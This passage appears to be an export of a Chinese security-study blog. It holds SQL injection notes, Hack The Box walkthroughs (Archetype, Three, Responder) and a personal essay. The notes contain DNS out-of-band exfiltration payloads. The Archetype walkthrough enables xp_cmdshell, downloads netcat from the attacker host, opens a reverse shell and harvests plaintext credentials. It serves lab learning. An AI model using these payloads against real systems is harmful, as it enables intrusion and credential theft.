load_file(concat(&quot;\\\\\\\\&quot;,version(),&quot;.dbuh8a.ceye.io\\\\xxx.txt&quot;))//查询当前数据库demo01中第一个表名id=1 and load_file(concat(&quot;\\\\\\\\&quot;,(select table_name from information_schema.tables where table_schema=&#x27;demo01&#x27; limit 0,1 ),&quot;.dbuh8a.ceye.io\\\\xxx.txt&quot;))&quot;&quot;&quot;由于该DNS记录只能回显一个字段，所以因该使用limit，第一个参数是查询起始位置，第二个参数是查询个数limit 0,1 查询第一个表名limit 1,1 查询第二个表名limit 2,1 查询第三个表名&quot;&quot;&quot;//查询security数据库emails表下第一个列名id=1 and load_file(concat(&quot;\\\\\\\\&quot;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; limit 0,1),&quot;.dbuh8a.ceye.io\\\\xxx.txt&quot;))//查询字段值 数据库名为security 表名emails 列名idid=1 and load_file(concat(&quot;\\\\\\\\&quot;,(select id from security.emails limit 0,1),&quot;.dbuh8a.ceye.io\\\\xxx.txt&quot;))","tags":["笔记","xiaodi8","web攻防"],"categories":["小迪","web攻防"]},{"title":"HTB-Archetype","path":"/2023/07/18/HTB/HTB-Archetype/","content":"开局先找汉语教： HTB_Archetype靶机之sqlserver提权_重返太空的博客-CSDN博客 https://www.czfq99.cn/archives/94.html 看了下标题好像是SQLSERVER的提权。 开始了，开局先扫端口吧，看看开启了哪些： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172┌──(kali㉿kali)-[~]└─$ nmap -sV 10.129.121.52 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-17 04:02 EDTNmap scan report for 10.129.121.52Host is up (0.37s latency).Not shown: 996 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 77.41 seconds┌──(kali㉿kali)-[~]└─$ nmap -sV -sC 10.129.168.67 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-18 03:34 EDTNmap scan report for 10.129.168.67Host is up (0.37s latency).Not shown: 996 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2023-07-18T06:36:33|_Not valid after: 2053-07-18T06:36:33|_ssl-date: 2023-07-18T07:37:27+00:00; -1s from scanner time.| ms-sql-info: | 10.129.168.67:1433: | Version: | name: Microsoft SQL Server 2017 RTM| number: 14.00.1000.00| Product: Microsoft SQL Server 2017| Service pack level: RTM| Post-SP patches applied: false|_ TCP port: 1433| ms-sql-ntlm-info: | 10.129.168.67:1433: | Target_Name: ARCHETYPE| NetBIOS_Domain_Name: ARCHETYPE| NetBIOS_Computer_Name: ARCHETYPE| DNS_Domain_Name: Archetype| DNS_Computer_Name: Archetype|_ Product_Version: 10.0.17763Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 1h23m59s, deviation: 3h07m52s, median: -1s| smb-os-discovery: | OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)| Computer name: Archetype| NetBIOS computer name: ARCHETYPE\\x00| Workgroup: WORKGROUP\\x00|_ System time: 2023-07-18T00:37:03-07:00| smb2-security-mode: | 311: |_ Message signing enabled but not required| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-time: | date: 2023-07-18T07:37:00|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 162.12 seconds 开了135、139、445、1433，第三个Dancing靶机有介绍过SSM的。 135 端口是远程过程调用 (RPC) 端口 ，Client-Server Model(客户端-服务器应用程序) 139 端口是 netbios-ssn，NetBIOS 是在所有当前版本 Windows 下用于文件和打印共享的协议，默认情况下，启用文件和打印共享后，会绑定到所有内容，包括 TCP&#x2F;IP ,这意味着除非配置不当的情况下，可以在互联网上访问本地的共享资源 445 端口 microsoft-ds 服务，也是 Client-Server Model，用于直接 TCP&#x2F;IP MS 网络访问，无需 NetBIOS 层，SMB 协议用于 Windows NT&#x2F;2K&#x2F;XP 和更高版本中的文件共享 使用命令行工具 smbclient 进行连接，使用 -L 命令显示服务器端分享的资源。 密码为空，直接进看看。 12345678910111213┌──(kali㉿kali)-[~]└─$ smbclient -L 10.129.121.52 Password for [WORKGROUP\\kali]: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin backups Disk C$ Disk Default share IPC$ IPC Remote IPCReconnecting with SMB1 for workgroup listing.do_connect: Connection to 10.129.121.52 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)Unable to connect with SMB1 -- no workgroup available 有了Dancing的经验直接连backups，无密码直连，下载prod.dtsConfig文件到本地再看： 1234567891011121314┌──(kali㉿kali)-[~]└─$ smbclient \\\\\\\\10.129.121.52\\\\backupsPassword for [WORKGROUP\\kali]:Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; ls . D 0 Mon Jan 20 07:20:57 2020 .. D 0 Mon Jan 20 07:20:57 2020 prod.dtsConfig AR 609 Mon Jan 20 07:23:02 2020 5056511 blocks of size 4096. 2616219 blocks availablesmb: \\&gt; cat prod.dtsConfigcat: command not foundsmb: \\&gt; get prod.dtsConfiggetting file \\prod.dtsConfig of size 609 as prod.dtsConfig (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec) 这到底是什么东西啊 12345678910┌──(kali㉿kali)-[~]└─$ cat prod.dtsConfig &lt;DTSConfiguration&gt; &lt;DTSConfigurationHeading&gt; &lt;DTSConfigurationFileInfo GeneratedBy=&quot;...&quot; GeneratedFromPackageName=&quot;...&quot; GeneratedFromPackageID=&quot;...&quot; GeneratedDate=&quot;20.1.2019 10:01:34&quot;/&gt; &lt;/DTSConfigurationHeading&gt; &lt;Configuration ConfiguredType=&quot;Property&quot; Path=&quot;\\Package.Connections[Destination].Properties[ConnectionString]&quot; ValueType=&quot;String&quot;&gt; &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt; &lt;/Configuration&gt;&lt;/DTSConfiguration&gt; 噢，是sql server，关系型数据库 同时发现敏感信息(mssql的账号密码) ID:ARCHETYPE\\sql_svc Password:M3g4c0rp123 如何连接呢，使用推荐工具 impacket 包连接，kali 中自带，windwos 可以使用 sqlserver management 桌面管理工具。 12345678910111213141516171819202122232425262728293031┌──(kali㉿kali)-[~]└─$ impacket-mssqlclient -hImpacket v0.10.0 - Copyright 2022 SecureAuth Corporationusage: mssqlclient.py [-h] [-port PORT] [-db DB] [-windows-auth] [-debug] [-file FILE] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] targetTDS client implementation (SSL supported).positional arguments: target [[domain/]username[:password]@]&lt;targetName or address&gt;options: -h, --help show this help message and exit -port PORT target MSSQL port (default 1433) -db DB MSSQL database instance (default None) -windows-auth whether or not to use Windows Authentication (default False) -debug Turn DEBUG output ON -file FILE input file with commands to execute in the SQL shellauthentication: -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH -no-pass don&#x27;t ask for password (useful for -k) -k Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line -aesKey hex key AES key to use for Kerberos Authentication (128 or 256 bits) -dc-ip ip address IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter 有了账户密码直连就行： 12345678910111213141516171819202122┌──(kali㉿kali)-[~]└─$ impacket-mssqlclient -windows-auth ARCHETYPE/sql_svc@10.129.121.52Impacket v0.10.0 - Copyright 2022 SecureAuth CorporationPassword:[*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(ARCHETYPE): Line 1: Changed database context to &#x27;master&#x27;.[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) [!] Press help for extra shell commandsSQL&gt; help lcd &#123;path&#125; - changes the current local directory to &#123;path&#125; exit - terminates the server process (and this session) enable_xp_cmdshell - you know what it means disable_xp_cmdshell - you know what it means xp_cmdshell &#123;cmd&#125; - executes cmd using xp_cmdshell sp_start_job &#123;cmd&#125; - executes cmd using the sql server agent (blind) ! &#123;cmd&#125; - executes a local shell cmd 💡 Here's two great articles that can guide us further to our exploration journey with MSSQL Server: https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet 这数据库似乎也没什么东西，下一步就是提权。 使用xp_cmdshell工具执行系统命令，xp_cmdshell 可以让系统管理员以操作系统命令行解释器的方式执行给定的命令字符串，是 sql servevr 的原生工具。 然后报错发现没开启权限： 123xp_cmdshell &quot;whoami&quot;[-] ERROR(ARCHETYPE): Line 1: Incorrect syntax near &#x27;&gt;&#x27;. 使用如下命令修改配置： 1234SQL&gt; EXECUTE sp_configure &#x27;show advanced options&#x27;, 1;SQL&gt; RECONFIGURE;SQL&gt; EXECUTE sp_configure &#x27;xp_cmdshell&#x27;, 1;SQL&gt; RECONFIGURE; 12345678910111213141516171819202122232425SQL&gt; SELECT is_srvrolemember(&#x27;sysadmin&#x27;);----------- 1 SQL&gt; EXEC xp_cmdshell &#x27;net user&#x27;;[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure &#x27;sys.xp_cmdshell&#x27; of component &#x27;xp_cmdshell&#x27; because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of &#x27;xp_cmdshell&#x27; by using sp_configure. For more information about enabling &#x27;xp_cmdshell&#x27;, search for &#x27;xp_cmdshell&#x27; in SQL Server Books Online.SQL&gt; EXEC sp_configure &#x27;show advanced options&#x27;, 1;[*] INFO(ARCHETYPE): Line 185: Configuration option &#x27;show advanced options&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.SQL&gt; RECONFIGURE;SQL&gt; sp_configure; - Enabling the sp_configure as stated in the above error message[-] ERROR(ARCHETYPE): Line 1: Incorrect syntax near &#x27;-&#x27;.SQL&gt; EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;[*] INFO(ARCHETYPE): Line 185: Configuration option &#x27;xp_cmdshell&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.SQL&gt; RECONFIGURE;SQL&gt; xp_cmdshell &quot;whoami&quot;output -------------------------------------------------------------------------------- archetype\\sql_svc NULL 查看当前目录 1234567891011121314151617181920SQL&gt; xp_cmdshell &quot;powershell -c pwd&quot;output -------------------------------------------------------------------------------- NULL Path ---- C:\\Windows\\system32 NULL NULL NULL SQL&gt; 网慢的不行，下载菜刀64都是在自己机子开VPN下的，而且放在桌面不行，必须要把菜刀放在当前路径下， 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253SQL&gt; xp_cmdshell &quot;powershell -c cd C:\\Users\\sql_svc\\Downloads; wget http://10.10.14.68/nc64.exe -outfile nc64.exe&quot;output -------------------------------------------------------------------------------- wget : &lt;!DOCTYPE HTML&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;Error response&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Error response&lt;/h1&gt; &lt;p&gt;Error code: 404&lt;/p&gt; &lt;p&gt;Message: File not found.&lt;/p&gt; &lt;p&gt;Error code explanation: 404 - Nothing matches the given URI.&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; At line:1 char:32 + ... sql_svc\\Downloads; wget http://10.10.14.68/nc64.exe -outfile nc64.exe + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc eption + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand NULL SQL&gt; xp_cmdshell &quot;powershell -c cd C:\\Users\\sql_svc\\Downloads; wget http://10.10.14.68/nc64.exe -outfile nc64.exe&quot;output -------------------------------------------------------------------------------- NULL SQL&gt; 监听终于返回200成功 123456789┌──(kali㉿kali)-[~]└─$ sudo python3 -m http.server 80[sudo] password for kali: Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.129.168.67 - - [18/Jul/2023 04:26:15] code 404, message File not found10.129.168.67 - - [18/Jul/2023 04:26:15] &quot;GET /nc64.exe HTTP/1.1&quot; 404 -10.129.168.67 - - [18/Jul/2023 04:39:58] code 404, message File not found10.129.168.67 - - [18/Jul/2023 04:39:58] &quot;GET /nc64.exe HTTP/1.1&quot; 404 -10.129.168.67 - - [18/Jul/2023 04:41:07] &quot;GET /nc64.exe HTTP/1.1&quot; 200 - 现在，我们可以通过nc将cmd.exe绑定到我们的侦听器 1SQL&gt; xp_cmdshell &quot;powershell -c cd C:\\Users\\sql_svc\\Downloads; . c64.exe -e cmd.exe 10.10.14.68 443&quot; 下面直接看nc监听443端口，获取到了shell会话： 123456789101112131415161718192021222324┌──(kali㉿kali)-[~]└─$ sudo nc -lvnp 443[sudo] password for kali: listening on [any] 443 ...connect to [10.10.14.68] from (UNKNOWN) [10.129.168.67] 49678Microsoft Windows [Version 10.0.17763.2061](c) 2018 Microsoft Corporation. All rights reserved.C:\\Users\\sql_svc\\Downloads&gt;dirdir Volume in drive C has no label. Volume Serial Number is 9565-0B4F Directory of C:\\Users\\sql_svc\\Downloads07/18/2023 01:41 AM &lt;DIR&gt; .07/18/2023 01:41 AM &lt;DIR&gt; ..07/18/2023 01:41 AM 45,272 nc64.exe 1 File(s) 45,272 bytes 2 Dir(s) 10,714,288,128 bytes freeC:\\Users\\sql_svc\\Downloads&gt;whoamiwhoamiarchetype\\sql_svc 还是没权限，哈哈 介绍提权工具：WINPEAS，还是开VPN下载的，windows还要关病毒防护 然后在监听处发现200成功： 12345678910111213141516171819C:\\Users\\sql_svc\\Downloads&gt;powershell -c wget http://10.10.14.68/winPEASx64.exe -outfile winPEASx64.exepowershell -c wget http://10.10.14.68/winPEASx64.exe -outfile winPEASx64.exe10.129.168.67 - - [18/Jul/2023 05:09:58] &quot;GET /winPEASx64.exe HTTP/1.1&quot; 200 -C:\\Users\\sql_svc\\Downloads&gt;dirdir Volume in drive C has no label. Volume Serial Number is 9565-0B4F Directory of C:\\Users\\sql_svc\\Downloads07/18/2023 02:09 AM &lt;DIR&gt; .07/18/2023 02:09 AM &lt;DIR&gt; ..07/18/2023 01:41 AM 45,272 nc64.exe07/18/2023 02:06 AM 0 powershell07/18/2023 02:10 AM 1,930,752 winPEASx64.exe 3 File(s) 1,976,024 bytes 2 Dir(s) 10,710,515,712 bytes free 使用命令运行提权工具，最后显示： 1234567891011����������͹ Analyzing Other Windows Files Files (limit 70) /---------------------------------------------------------------------------\\ | Do you like PEASS? | |---------------------------------------------------------------------------| | Become a Patreon : https://www.patreon.com/peass | | Follow on Twitter : @carlospolopm | | Respect on HTB : SirBroccoli &amp; makikvues | |---------------------------------------------------------------------------| | Thank you! | \\---------------------------------------------------------------------------/ 密码：MEGACORP_4dm1n!! 12345678910111213141516171819202122232425262728293031323334353637383940C:\\Users\\sql_svc\\Downloads&gt;cd ..cd ..C:\\Users\\sql_svc&gt;cd AppDatacd AppDataC:\\Users\\sql_svc\\AppData&gt;cd \\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ cd \\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\The system cannot find the path specified.C&#x27; is not recognized as an internal or external command,operable program or batch file.C:\\Users\\sql_svc\\AppData&gt;cd Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ cd Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine&gt;dirdir Volume in drive C has no label. Volume Serial Number is 9565-0B4F Directory of C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine01/20/2020 06:04 AM &lt;DIR&gt; .01/20/2020 06:04 AM &lt;DIR&gt; ..03/17/2020 02:36 AM 79 ConsoleHost_history.txt 1 File(s) 79 bytes 2 Dir(s) 10,710,208,512 bytes freeC:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine&gt;type ConsoleHost_history.txttype ConsoleHost_history.txtnet.exe use T: \\\\Archetype\\backups /user:administrator MEGACORP_4dm1n!!exitC:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine&gt;python3 psexec.py administrator@10.129.168.67python3 psexec.py administrator@10.129.168.67&#x27;python3&#x27; is not recognized as an internal or external command,operable program or batch file.C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine&gt; 123456789101112131415161718C:\\Windows\\system32&gt; cd ..C:\\Windows&gt; cd ..C:\\&gt; cd UserThe system cannot find the path specified.C:\\&gt; cd UsersC:\\Users&gt; cd AdministartorThe system cannot find the path specified.C:\\Users&gt; cd AdministratorC:\\Users\\Administrator&gt; cd DesktopC:\\Users\\Administrator\\Desktop&gt; type root.txtb91ccec3305e98240082d4474b848528","tags":["HTB","笔记","STARTING POINT"],"categories":["Range","HTB"]},{"title":"HTB-Three","path":"/2023/07/13/HTB/HTB-Three/","content":"这次咱就是说一开始就找一个别人通关的汉语教程来： Hack The Box - Three(新手友好)_觉醒猴子的博客-CSDN博客 Linux tee命令Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。 tee指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件。 1tee [-ai][--help][--version][文件...] 参数： a或–append　附加到既有文件的后面，而非覆盖它． i或–ignore-interrupts　忽略中断信号。 -help　在线帮助。 -version　显示版本信息。 1234567891011121314151617┌──(root㉿kali)-[/home/kali]└─# nmap -sV 10.129.115.172 Starting Nmap 7.93 ( &lt;https://nmap.org&gt; ) at 2023-07-14 03:36 EDTNmap scan report for 10.129.115.172Host is up (0.30s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .Nmap done: 1 IP address (1 host up) scanned in 108.80 seconds┌──(root㉿kali)-[/home/kali]└─# echo &quot;10.129.115.172 thetoppers.htb&quot; | tee -a /etc/hosts 10.129.115.172 thetoppers.htb gobuster相关然后gobuster无法扫描出结果啦，真是醉了，也无法更改默认响应时间。 但是临下班顺手使用DNS竟然给我扫出来了！ 1234567891011121314151617181920┌──(root㉿kali)-[/home/kali]└─# gobuster dns -w /usr/share/wordlists/amass/subdomains.lst -d thetoppers.htb ===============================================================Gobuster v3.5by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Domain: thetoppers.htb[+] Threads: 10[+] Timeout: 1s[+] Wordlist: /usr/share/wordlists/amass/subdomains.lst===============================================================2023/07/14 04:48:44 Starting gobuster in DNS enumeration mode===============================================================Found: s3.thetoppers.htbProgress: 8215 / 8216 (99.99%)===============================================================2023/07/14 04:51:49 Finished=============================================================== 123456789101112131415161718192021222324252627┌──(kali㉿kali)-[~]└─$ gobuster dns --helpUses DNS subdomain enumeration modeUsage: gobuster dns [flags]Flags: -d, --domain string The target domain -h, --help help for dns -r, --resolver string Use custom DNS server (format server.com or server.com:port) -c, --show-cname Show CNAME records (cannot be used with &#x27;-i&#x27; option) -i, --show-ips Show IP addresses --timeout duration DNS resolver timeout (default 1s) --wildcard Force continued operation when wildcard foundGlobal Flags: --delay duration Time each thread waits between requests (e.g. 1500ms) --no-color Disable color output --no-error Don&#x27;t display errors -z, --no-progress Don&#x27;t display progress -o, --output string Output file to write results to (defaults to stdout) -p, --pattern string File containing replacement patterns -q, --quiet Don&#x27;t print the banner and other noise -t, --threads int Number of concurrent threads (default 10) -v, --verbose Verbose output (errors) -w, --wordlist string Path to the wordlist 12345678910111213141516171819202122232425262728293031323334353637383940414243┌──(kali㉿kali)-[~]└─$ gobuster vhost --helpUses VHOST enumeration mode (you most probably want to use the IP address as the URL parameter)Usage: gobuster vhost [flags]Flags: --append-domain Append main domain from URL to words from wordlist. Otherwise the fully qualified domains need to be specified in the wordlist. --client-cert-p12 string a p12 file to use for options TLS client certificates --client-cert-p12-password string the password to the p12 file --client-cert-pem string public key in PEM format for optional TLS client certificates --client-cert-pem-key string private key in PEM format for optional TLS client certificates (this key needs to have no password) -c, --cookies string Cookies to use for the requests --domain string the domain to append when using an IP address as URL. If left empty and you specify a domain based URL the hostname from the URL is extracted --exclude-length ints exclude the following content length (completely ignores the status). Supply multiple times to exclude multiple sizes. -r, --follow-redirect Follow redirects -H, --headers stringArray Specify HTTP headers, -H &#x27;Header1: val1&#x27; -H &#x27;Header2: val2&#x27; -h, --help help for vhost -m, --method string Use the following HTTP method (default &quot;GET&quot;) --no-canonicalize-headers Do not canonicalize HTTP header names. If set header names are sent as is. -k, --no-tls-validation Skip TLS certificate verification -P, --password string Password for Basic Auth --proxy string Proxy to use for requests [http(s)://host:port] --random-agent Use a random User-Agent string --retry Should retry on request timeout --retry-attempts int Times to retry on request timeout (default 3) --timeout duration HTTP Timeout (default 10s) -u, --url string The target URL -a, --useragent string Set the User-Agent string (default &quot;gobuster/3.5&quot;) -U, --username string Username for Basic AuthGlobal Flags: --delay duration Time each thread waits between requests (e.g. 1500ms) --no-color Disable color output --no-error Don&#x27;t display errors -z, --no-progress Don&#x27;t display progress -o, --output string Output file to write results to (defaults to stdout) -p, --pattern string File containing replacement patterns -q, --quiet Don&#x27;t print the banner and other noise -t, --threads int Number of concurrent threads (default 10) -v, --verbose Verbose output (errors) -w, --wordlist string Path to the wordlist 反弹shell1、反弹shell，看这一篇就够了","tags":["HTB","笔记","STARTING POINT"],"categories":["Range","HTB"]},{"title":"历经十年找寻毕生热爱之事","path":"/2023/07/13/胡言乱语/历经十年找寻毕生热爱之事/","content":"初中我有一个不属于现实世界的世界存在于我的幻想里，就小学五年级到初二那段时间我觉得我其实离那个世界很近很近，他们每天都在我的幻想重叠着我的现实生活出现，不是幻觉那种哈我没精神病，就是单纯幻想世界。很真实很真实，我为此还写了一部分小说，那时候写的主角一般都跟我同龄。 每次我看见这个世界发生的事情就很开心很开心，而且大部分是爽剧，我幻想里的剧情还有好多可爱大姐姐（这不是重点），有三个，她们很厉害，友谊也地久天长算是世家了。 后面初三到高中这个世界暗淡下去了。他们也很少再出现在我的幻想里，频率高的时候，那几年他们都故事居然都是连续的，每天醒着的三分之一的时间都会出现。现在想想小初的自己都好厉害，当时她们的剧情也是关于爽文友谊修仙超能力那种相关的。 初中那时候也很喜欢心理学和推理。参加过两届梦幻推理大赛（没啥名次，就玩啦，记得有次跟勒由认真做了第一轮的题），经常看心理学的书，但是看的不是学术严谨的教科书，那时候搜集资料信息渠道也没有像现在这样多。 高中太灰暗啦。仿佛失去了梦想一般，虽然也有一小部分感兴趣的，但是依然无法持久。并且整天无所事事，焦虑，抑郁，不安…..初中也有不安但是没那么严重。 然后就有了毕业留言册这个： 那时候报专业为什么选择心理学，只是那时候确实喜欢心理学，但是完全没有考虑过未来要做什么学心理有没有工作等等，就是喜欢就去学了。 好的是因为这个专业，女老师们和心理学一些知识，包括我也远离了家我以前那种状态彻底没了，仿佛开始新生活一样。算是彻彻底底调理好了吧。17-18，我总说这两年是我整个人生中状态最好的一年。 刚刚经过某大学朋友提醒，当时还参加了egt的类似夏令营的活动（但是那个机构整体运营模式就是传销模式，洗脑模式，最后公司合伙人17还是18年分道扬镳了），学了音标，演讲，做了很多脱离日常的事情，包括：公交车地铁高铁厚脸皮演讲高价售卖矿泉水棒棒糖、口吞火、每天六点二十起床去早读、和一群有意思的人做一些事儿哈哈… 下来状态次好可能就是到今年了。 19年初我又陷入了困境。 到底怎样才能冲破桎梏？ 那时候因为快毕业我终于开始考虑现实生活了，定居在哪个城市未来要做什么等等。 但是被这些事情困住以及复习应试就很难再去体验前两年那种心流的状态。 心流状态真的很好，就像无副作用的毒品一样，体验了一次就会让人欲罢不能。 并且我知道如何长时间到达这种状态持续下去，那就是去做喜欢的事，热爱的事。 问题就来了，当时的我并没有特别特别热爱的事情，虽然有感兴趣的事情，包括心理学，咨询相关，甚至哲学史这些，却总让我觉得这或许不够。而且这都是屠龙之术，非常难评。未来也找不到相关工作。我想找一件我既会热爱，并且又能养活自己的事情。 当时喜欢统计数据分析这种，还是因为本科的课程，后面就冲计算机了，已经很接近的，但纯编码仍然不喜欢呢。数据类要数学超强硕博起步，当时知道安全这些，但是仍然了解不多接触不多。 然后考研学了数学和计算机最基础的一门专业课，后面不考了打算工作，找了一个情报舆情监测分析类岗位（是想做的行业，但是工资低）。干了没几个月，接着就是又机缘巧合幸运去大学又续了两年，哈哈哈，那时候日子安逸，并且确实对纯编码觉得枯燥，也没好好学，21年下半年又谈恋爱去了。好的是接触到了女权，勇猛打拳半年，开开心心去见女朋友！ 这时候已经没有刻意去寻找热爱什么了。就是顺其自然，仍然没有冲破桎梏。 不过快毕业的时候就已经想做安全领域了，奈何入门和接近这些很难，自学也非常困难，路径不像开发那样平缓，开发资料多路途分明。安全还是蛮小一个圈子。 后面又是迷迷糊糊浑浑噩噩过了大半年，逃离了父亲给我安排的坑我的工作（不适合+不喜欢+工资低），不得不说母父总在坑我的道路上持之以恒，最终终于按照自己的规划和想法找到了相近的测试工作。 接着就是今年三四月正式工作之余开始学习安全相关的东西。 但是最近又太动荡了，同事仲裁收集证据、朋友被骗去传销我去报警、我骑自行车翻车了、和某些博主对冲被挂、五月底新冠一阳、再加上沙雕领导，啊啊啊啊啊啊。没有平静的生活耶，嘻嘻~ 最近感觉仿佛又回到了2017~2018年那个时间段。 就是这个对了的感觉，经常可以进入心流状态的事件。","tags":["随笔"],"categories":["碎碎念"]},{"title":"HTB-Responder","path":"/2023/07/12/HTB/HTB-Responder/","content":"ResponderIntroductionWindows is the most predominant operating system in today’s world because of its easy-to-use GUI accessibility. About 85% of the market share has become a critical OS to attack. Furthermore, most organizations use Active Directory to set up their Windows domain networks. Microsoft employs NTLM (New Technology LAN Manager) &amp; Kerberos for authentication services. Despite known vulnerabilities, NTLM remains widely deployed even on new systems to maintain compatibility with legacy clients and servers.This lab focuses on how a File Inclusion vulnerability on a webpage being served on a windows machine can be exploited to collect the NetNTLMv2 challenge of the user that is running the web server. We will use a utility called Responder to capture a NetNTLMv2 hash and later use a utility known as john the ripper to test millions of potential passwords to see if they match the one used to create the hash. We will also be taking a deeper look at the working process of NTLM authentication and how the Responder utility captures the challenge. We believe that it’s crucial to understand the under the hood workings of a tool or a framework as it strengthens the foundation of one’s understanding, which aids in the real world exploit scenarios that one might face, which do not appear to be vulnerable at the first look. Let’s dive straight into it. Windows是当今世界上最主要的操作系统，因为它易于使用的GUI可访问性。大约85%的市场份额已经成为攻击的关键操作系统。此外，大多数组织都使用Active Directory来设置其Windows域网络。Microsoft使用NTLM（新技术局域网管理器）和Kerberos进行身份验证服务。尽管存在已知的漏洞，NTLM仍然被广泛部署在新系统上，以保持与旧客户端和服务器的兼容性。本实验室的重点是如何利用windows计算机上提供的网页上的文件包含漏洞来收集运行web服务器的用户的NetNTLMv2挑战。我们将使用一个名为Responder的实用程序来捕获NetNTLMv2哈希，然后使用一个称为john the ripper的实用程序测试数百万个潜在密码，看看它们是否与用于创建哈希的密码匹配。我们还将深入了解NTLM身份验证的工作过程，以及响应程序实用程序如何应对这一挑战。我们认为，理解一个工具或框架的幕后工作至关重要，因为它加强了人们理解的基础，有助于在现实世界中利用人们可能面临的场景，而这些场景乍一看并不脆弱。让我们直接切入。 EnumerationWe will begin by scanning the host for any open ports and running services with a Nmap scan. We will be using the following flags for the scan: 📎 p- : This flag scans for all TCP ports ranging from 0-65535 -sV : Attempts to determine the version of the service running on a port --min-rate : This is used to specify the minimum number of packets Nmap should send per second; it speeds up the scan as the number goes higher Nmap如何确定端口上运行的服务？Nmap使用知名服务的端口服务数据库来确定在特定端口上运行的服务。它稍后还会向该端口发送一些特定于服务的请求，以确定服务版本和任何有关它的附加信息。因此，对于特定端口的服务信息，Nmap大多是但并不总是正确的。 According to the results of the Nmap scan, the machine is using Windows as its operating system. Two ports were detected as open having Apache web server running on port 80 along with WinRM on port 5985 . 根据Nmap扫描的结果，该机器正在使用Windows作为其操作系统。检测到两个端口打开，Apache web服务器在端口80上运行，WinRM在端口5985上运行。 ❓ Windows Remote Management, or WinRM, is a Windows-native built-in remote management protocol that basically uses Simple Object Access 